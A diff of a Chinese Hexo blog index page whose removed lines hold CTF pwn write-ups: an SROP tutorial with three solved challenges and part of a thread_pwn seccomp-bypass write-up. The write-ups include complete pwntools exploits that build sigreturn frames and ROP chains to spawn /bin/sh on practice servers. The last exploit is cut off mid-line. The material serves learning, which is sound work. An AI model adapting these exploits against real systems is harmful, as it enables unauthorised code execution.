@@ -186,7 +186,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-23 17:57:15" itemprop="dateModified" datetime="2025-02-23T17:57:15+08:00">2025-02-23</time>
+                <time title="修改时间：2025-02-23 18:14:22" itemprop="dateModified" datetime="2025-02-23T18:14:22+08:00">2025-02-23</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -209,74 +209,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <span id="more"></span>
-
-<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​	<code>ROP(Return Oriented Programming)</code>是利用程序中的一系列<code>ret</code>指令来构造恶意代码执行链。而<code>SROP</code>即利用<code>sigreturn</code>函数完成以上内容。</p>
-<p>这里放一张我看其他师傅博客上的一张图，完成一次系统调用的过程如下：</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908627.png" alt="image-20240122163354902"></p>
-<p>①：用户态进程接收到信号<code>signal</code>，该进程被挂起，进入内核态。</p>
-<p>②：内核保存用户态进程的上下文，然后跳转到用户态的信号<code>signal</code>对应的信号处理程序，回到用户态。在这一阶段里，内核会构造一个位于用户栈上的<code>Signal Frame</code>用于存放该进程的上下文，然后再<code>push</code>返回地址<code>rt_sigreturn</code>。</p>
-<p>③：用户态的信号处理程序执行完毕，<code>pop</code>返回地址<code>rt_sigreturn</code>，进程进入内核态，执行<code>sigreturn</code>系统调用。内核根据之前栈上的<code>Signal Frame</code>完成用户态进程上下文的恢复。</p>
-<p>④：返回用户态，进程按照恢复的上下文继续执行。</p>
-<p>​	<code>SROP</code>作用于第3阶段，也就是内核根据<code>Signal Frame</code>的内容恢复进程上下文的过程。</p>
-<p>​	<code>Signal Frame</code>（类似下面这张图）是一个已知的数据结构，而且其存在于用户态的栈上。内核在恢复上下文时并不能确保其内容没有被修改过。因此，如果我们能够在栈上构造<code>sigreturn</code>系统调用与新的<code>Signal Frame</code>结构体的话，就能够实现攻击的效果。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908826.png" alt="image-20240122203103809"></p>
-<p>​	<code>sigreturn</code>函数用于从信号处理程序中恢复到原始的系统调用状态，调用号为<code>0xf</code>，通过<code>syscall</code>指令直接调用。在<code>x86-64</code>架构的<code>Linux</code>系统中，<code>syscall</code>指令的调用号存储在寄存器<code>rax</code>中。</p>
-<h2 id="srop的做题条件"><a href="#srop的做题条件" class="headerlink" title="srop的做题条件"></a><code>srop</code>的做题条件</h2><ul>
-<li>一定要能调用<code>sigreturn</code>，也就是说程序中要有<code>syscall</code>的指令并知道其地址，还需要让<code>rax</code>寄存器值为<code>0xf</code>。</li>
-<li>必须要能知道<code>/bin/sh</code>在程序中的地址。</li>
-</ul>
-<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a><code>ciscn_2019_es_7</code></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	系统调用了<code>sys_read</code>和<code>sys_write</code>，并且可以溢出<code>0x400-0x10</code>个字节</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908713.png" alt="image-20240122163539371"></p>
-<p>​	我们看到<code>mov rax,0fh;retn</code>的<code>gadget</code>，<code>0fh</code>是<code>sigreturn</code>函数的调用号，可以用<code>SROP</code>。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908087.png" alt="image-20240122152721309"></p>
-<p>​	程序中没有<code>/bin/sh</code>，我们可以在<code>sys_read(0,buf,0x400ull)</code>这一过程中先把<code>/bin/sh</code>写到<code>buf</code>中，然后<code>sys_write(1u,buf,0x30ull)</code>这一过程会把<code>buf</code>及后面的内容共<code>0x30</code>个字节打印出来，这样我们就可以泄漏一个栈地址，然后计算其与<code>/bin/sh</code>的地址的偏移，表示出<code>/bin/sh</code>的地址。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line">binsh_addr = one_addr-<span class="number">0x148</span></span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>
-
-<p>​	得到<code>/bin/sh</code>的地址后，构造一个<code>execve</code>的<code>signal frame</code>，如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = binsh_addr  <span class="comment">#第一个参数</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_addr  <span class="comment">#下面解释</span></span><br></pre></td></tr></table></figure>
-
-<p>​	首先我们要知道，<code>rip</code>是一个指令指针的寄存器，也就是说<code>rip</code>寄存器中存放的是要执行的下一条指令的地址。而<code>frame.rip</code>中存放的是 当<code>sigreturn</code>系统调用返回后要执行的下一条指令的地址。这里的<code>frame.rip = syscall_leave_ret</code>就表示我们将要执行<code>syscall</code>指令，又因为我们已经设置了<code>execve</code>的<code>signal frame</code>，所以我们就控制了程序的执行流执行<code>execve</code>系统调用。</p>
-<p>​	构造第二个<code>payload</code>如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr)  <span class="comment">#sigreturn的调用号是0xf</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<p>​	一开始我把<code>payload = payload = b&#39;/bin/sh\x00&#39;.ljust(16,b&#39;\x00&#39;)</code>写成<code>payload = b&#39;a&#39;*16</code>打不通。调试的时候发现，<code>vuln</code>函数是又被循环了一次，这个<code>payload</code>是会往<code>buf</code>中写覆盖原来的内容，也就是说我们上面泄漏的地址<code>binsh_addr</code>，中的内容会变成这次发送的前<code>8</code>个字节。所以我们构造的<code>payload</code>的前<code>8</code>个字节必须是<code>/bin/sh\x00</code>。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26868</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./es7&#x27;)</span></span><br><span class="line">context.arch =<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x148</span></span><br><span class="line">binsh_addr = one_addr-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="comment">#0x148是本地的偏移量，远程的应该是0x118，本地与远程的libc不同</span></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_addr </span><br><span class="line"></span><br><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr) </span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>拿到<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908737.png" alt="image-20240122171324394"></p>
-<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a><code>rootersctf_2019_srop</code></h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​	我们分析代码，发现连<code>main</code>函数都没有，整个程序就是先<code>call 0x401000</code>，然后<code>exit</code>退出。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909604.png" alt="image-20240206133317497"></p>
-<p>​	跳到地址为<code>0x401000</code>这里，分析汇编代码，<code>2</code>个系统调用，<code>write(1,buf,0x2a),read(0,rsp-0x40,0x400)</code>。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909651.png" alt="image-20240206132903020"></p>
-<p>​	程序中没有<code>/bin/sh</code>，所以我们要先往一个地址中写入<code>/bin/sh</code>。如果我们直接写入<code>/bin/sh</code>再<code>srop</code>，我们不能知道<code>/bin/sh</code>的地址，所以可以先栈迁移到<code>data</code>段，<code>data</code>段的地址已知且不变，这样我们就拿到<code>/bin/sh</code>的地址了，设置<code>read</code>的一些寄存器值，如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  <span class="comment">#read的系统调用号</span></span><br><span class="line">frame.rdi = <span class="number">0</span>  <span class="comment">#标准输入</span></span><br><span class="line">frame.rsi = buf_addr  <span class="comment">#写入的位置的起始地址</span></span><br><span class="line">frame.rdx = <span class="number">0x400</span>  <span class="comment">#可以写入的字节个数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#syscall系统调用read</span></span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br></pre></td></tr></table></figure>
-
-<p>不过这里<code>frame.rbp = buf_addr+0x20</code>的作用是什么？）</p>
-<p>​	然后我们可以构造第一个<code>payload</code>如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="comment"># srop to call read, set *data_addr = /bin/sh\x00</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br></pre></td></tr></table></figure>
-
-<p>​	上面构造的<code>signal frame</code>再次<code>syscall</code>了一个<code>read</code>系统调用，下面我们就可以往<code>buf_addr = 0x402000</code>里写入<code>/bin/sh</code>，并再次构造一个<code>signal frame</code>系统调用<code>execve</code>。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = buf_addr  <span class="comment">#/bin/sh的地址</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#</span></span><br><span class="line"><span class="comment">#frame.rbp =   #没有rbp了</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./srop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26592</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span> </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = buf_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = buf_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>拿到<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909642.png" alt="image-20240206160012074"></p>
-<h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a><code>360chunqiu2017_smallest</code></h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>我们每次控制寄存器的时候，都把<code>rsp</code>写成下一个片段的<code>rt_sigreturn</code>的地址，并且<code>rip</code>的地址要指向<code>syscall；ret</code> 一定要后面有<code>ret</code>，不然所有的片段连不起来，到<code>ret</code>的时候，就会去执行<code>rsp</code>执行的地址，因此我们就可以一直劫持程序的控制流。</p>
-<p>​	程序很简单，只有下面一个函数，分析一下代码就是一个<code>read</code>系统调用，可以栈溢出并且能够溢出的字节数很长。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909763.png" alt="image-20240207130130852"></p>
-<p>​	这道题既然是用<code>srop</code>，那么必然是需要能够调用<code>sigreturn</code>，也就是需要把<code>rax</code>寄存器的值设置为<code>0xf</code>。我们发现并没有能够实现这个的相关的<code>gadget</code>，但是我们突然想到<code>read</code>返回值就是存储在<code>rax</code>寄存器中的，我们可以利用这个来设置<code>rax</code>寄存器的值。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#第一个start去让第一次正常运行的ret返回到start</span></span><br><span class="line"><span class="comment">#第二个start让\xB3输入进来，此时去改变了栈顶的start，此时它跳过了xor rax,rax，并</span></span><br><span class="line"><span class="comment">#且它的下面还有一个start</span></span><br><span class="line"><span class="comment">#最下面的start是让我们可以再输入frame，一直控制程序执行流</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span><span class="comment">#减去0x2000，把payload写到该地址</span></span><br></pre></td></tr></table></figure>
-
-<p><code>exp</code>如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29210</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smallest&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = target_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_ret_addr  </span><br><span class="line">frame.rsp = target_addr  </span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">binsh_addr = target_addr+<span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  </span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_ret_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>拿到<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909062.png" alt="image-20240219151202950"></p>
-
+          <p>SROP漏洞总结。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/01/17/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -590,7 +531,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-23 17:53:20" itemprop="dateModified" datetime="2025-02-23T17:53:20+08:00">2025-02-23</time>
+                <time title="修改时间：2025-02-23 18:04:36" itemprop="dateModified" datetime="2025-02-23T18:04:36+08:00">2025-02-23</time>
               </span>
 
           
@@ -604,53 +545,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <span id="more"></span>
-
-<h2 id="thread-pwn"><a href="#thread-pwn" class="headerlink" title="thread_pwn"></a><em>thread_pwn</em></h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101140929.png" alt="image-20240428181256065" style="zoom:80%;" />
-
-<p>开了沙箱保护策略，程序中只允许出现<code>read,write,clock_nanosleep,exit_group</code>这些系统调用。</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141726.png" alt="image-20240428181336131" style="zoom:80%;" />
-
-<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>程序创建了一个线程，在这个线程中调用<code>start_routine</code>函数</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141777.png" alt="image-20240428184506061" style="zoom:80%;" />
-
-<p>有一个栈溢出漏洞，可以溢出<code>0x10</code>个字节</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141344.png" alt="image-20240427204331334" style="zoom:67%;" />
-
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142752.png" alt="image-20240428175826441"></p>
-<p><code>start_routine</code>函数</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101143181.png" alt="image-20240428184444419" style="zoom:80%;" />
-
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	如果是一般的题并且没有开沙箱，可以栈迁移打<code>ret2libc</code>。但是本题开了沙箱，程序中不允许出现除<code>read,write,clock_nanosleep,exit_group</code>之外的系统调用。与此同时，本题也创建了一个子线程，也就是说我们有可能在子线程中执行后门函数去拿到<code>shell</code>。</p>
-<p>在父进程中布置<code>rop</code>，栈迁移，泄漏<code>libc</code>，并修改<code>sleep</code>函数的<code>got</code>表为<code>call_read</code>的地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line"><span class="comment">#再read一次，依旧0x50个字节。由于lea rax,[rbp-0x40]这个指令，我们在这里覆盖rbp的时候要在.bss段的地址上+0x40</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#下面这个payload中的前0x40个字节被写到.bss(0x404400)</span></span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line"><span class="comment">#让rbp中为elf.got[&#x27;sleep&#x27;]+0x40，然后通过lea rax,[rbp-0x40]，mov rsi,rax这两个指令，下一次read的时候，我们就能覆盖sleep函数的got表中的内容为call_read的地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line"><span class="comment">#              rbp         自己加一个leave ; ret栈迁移</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
-
-<p>让父进程陷入死循环</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(call_read) <span class="comment">#把call_read的地址写到sleep函数got表中</span></span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span>  <span class="comment">#让父进程陷入死循环</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line"><span class="comment">#rbp为sleep的got表，栈迁移把执行流迁移到sleep函数也就是程序中的call_read地址</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
-
-<p>布置<code>rop</code>链</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401593</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401591</span></span><br><span class="line">pop_rbp = <span class="number">0x40123d</span></span><br><span class="line">leave_ret = <span class="number">0x401481</span></span><br><span class="line">bss = <span class="number">0x404400</span></span><br><span class="line">call_read = <span class="number">0x4014be</span></span><br><span class="line">data = <span class="number">0x404068</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;This is my thread...&#x27;</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;write_addr&quot;</span>)</span><br><span class="line">libc_base = write_addr-libc.sym[<span 